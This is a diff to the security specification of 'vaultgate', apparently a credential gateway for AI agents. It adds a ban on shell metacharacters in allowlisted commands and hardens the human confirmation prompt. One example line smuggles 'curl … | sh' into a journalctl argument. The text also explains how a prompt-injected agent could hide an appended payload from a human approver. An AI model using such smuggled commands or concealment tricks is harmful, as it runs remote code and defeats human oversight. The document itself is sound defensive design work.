@@ -295,8 +295,8 @@ operations, confirm_writes, engine?, unrestricted? }` where `operations` is the 
 - **ACT-27** Input for both: `target`; `command` (string ≤ 16 KiB; no NUL byte and no other C0
   control character — tab, carriage return and line feed are the only ones accepted, because XML
   1.0 cannot carry the rest even as a character reference and `winrm_run` sends the command in a
-  SOAP envelope; a newline or carriage return is allowed only on a target with
-  `any_command: true`); `stdin` (optional string
+  SOAP envelope; a newline, a carriage return and the shell metacharacters of ACT-35 are allowed
+  only on a target with `any_command: true`); `stdin` (optional string
   ≤ 64 KiB, written to the process's standard input and then closed). Output for both:
   `exit_code` (integer, or `null` when the channel closed without one), `stdout`, `stderr`,
   `truncated`, `duration_ms`. `stdout` and `stderr` are captured separately and each is capped at
@@ -354,7 +354,16 @@ before anything else (ACT-16) and a session opened by another client answers `un
   pattern matches the whole subject.
 - **ACT-35** HTTP subjects are the request path plus query, relative to `base_url`, after
   normalisation (percent-decoding of unreserved characters, dot-segment removal). Command subjects
-  are the exact `command` string. Browser origins are compared exactly (scheme, host, port) and
+  are the exact `command` string, and on a target that is not an `any_command` one a command MUST
+  NOT contain a shell metacharacter — `;`, `&`, `|`, a backtick, `$`, `<`, `>`, `(` or `)` — any
+  more than it may contain a line break: it fails `policy_denied` (`reason:
+command_metacharacter`) before the patterns are consulted. A pattern cannot restrain one, because
+  `*` matches a run of characters and every metacharacter is a character; without this rule a
+  single wildcard made `journalctl -u nginx --since *` accept
+  `journalctl -u nginx --since $(curl … | sh)`, so every allowlist holding a wildcard was an
+  unrestricted target without the deployment switch of ACT-88, the standing operator warning,
+  `unrestricted: true` in `actions_list_targets` or the full command in `classification`. A
+  pattern that itself holds a metacharacter could therefore never match and is refused at save. Browser origins are compared exactly (scheme, host, port) and
   are never patterns. A pattern that would allow everything (`*`, `**`) is refused at save for
   commands unless `any_command` is what the operator means; for paths `/**` is allowed and is the
   documented way to say "the whole API". Each `allowed_paths` pattern is itself checked at save:
@@ -394,7 +403,7 @@ before anything else (ACT-16) and a session opened by another client answers `un
 - **ACT-39** `authorize` returns `{ allowed: true, operation: 'read' | 'write' | 'shell' | 'act',
 class? }` or `{ allowed: false, reason }` with `reason` one of `method`, `path`, `header`,
   `body_size`, `operation`, `statement_count`, `statement_class`, `statement_pattern`, `command`,
-  `command_size`, `origin`, `element`. The reason is returned to the agent in the tool error and
+  `command_metacharacter`, `command_size`, `origin`, `element`. The reason is returned to the agent in the tool error and
   audited; the pattern or origin list itself is not returned.
 - **ACT-40** A call is a **non-read call** when `authorize` classifies it as `write`, `shell` or
   `act`: every `sql_execute`, every `ssh_run` and `winrm_run`, every `http_request` whose method
@@ -422,7 +431,7 @@ class? }` or `{ allowed: false, reason }` with `reason` one of `method`, `path`,
       "method": "elicitation/create",
       "params": {
         "mode": "form",
-        "message": "vaultgate: <client name> asks to run <tool> on target \"<name>\" (<connector>, <destination summary>).\n\n<operation summary>\n\nAllow this one call? It expires in 2 minutes and cannot be reused.",
+        "message": "vaultgate: <client name> asks to run <tool> on target \"<name>\" (<connector>, <destination summary>).\n\nThe operation, every line of it quoted with \"> \":\n> <operation summary, one quoted line per line>\n\n[NOT SHOWN: … — present only when the summary is an excerpt, ACT-43]\n\nAllow this one call? It expires in 2 minutes and cannot be reused.",
         "requestedSchema": {
           "type": "object",
           "properties": {
@@ -443,12 +452,26 @@ class? }` or `{ allowed: false, reason }` with `reason` one of `method`, `path`,
 ```
 
 - **ACT-43** `<destination summary>` is the host (and database, base path or origin) only;
-  `<operation summary>` is the method and path, the statement (first 1 KiB), the command (first
-  1 KiB) or, for a browser action, the page URL and the element's accessible name and the text
-  to type, built from the agent's arguments and the target's metadata and passed through the
-  scrubber (13.9) like any output. The message never contains an injected value, a policy
-  pattern or a vault item id. It is built before the credential is fetched (ACT-41), so at that
+  `<operation summary>` is the method and path, the statement, the command or, for a browser
+  action, the page URL and the element's accessible name and the text to type, built from the
+  agent's arguments and the target's metadata and passed through the scrubber (13.9) like any
+  output. The message never contains an injected value, a policy pattern or a vault item id.
+
+  The summary is the last line of defence against a prompt-injected agent talking an honest human
+  into a call, so it is never shortened in silence. An operation longer than 1 KiB is shown as its
+  first 768 characters and its last 192, joined by `…` on lines of its own, and the message then
+  carries a line of vaultgate's own — outside the quoted block, where the agent's text cannot
+  reach — saying how many characters are missing and the SHA-256 of the whole operation. Showing
+  the tail matters: a payload appended to a long prelude is exactly what a head-only cut hides.
+  vaultgate does not refuse to confirm a long operation, because refusing would push an operator
+  towards `confirm_writes: false`, which is the weaker of the two states this clause exists to
+  protect.
+
+  Every line of the summary is prefixed with a quote marker (`>` and a space) and the message says so, so an agent cannot
+  reproduce the message's own trailer: a line it writes is a quoted line, and the trailer is the
+  only unquoted one. It is built before the credential is fetched (ACT-41), so at that
   point there is no injected value to scrub; the canary suite of ACT-53 asserts it is clean.
+
 - **ACT-44** `requestState` is `base64url(payload) + "." + base64url(HMAC-SHA256(payload))` under
   a key derived from `VAULTGATE_SECRET_KEY` (HKDF purpose `vaultgate/actions-confirmation/v1`),
   where `payload` is JSON of `{ v: 1, nonce, target_id, revision, tool, client_id, token_prefix,
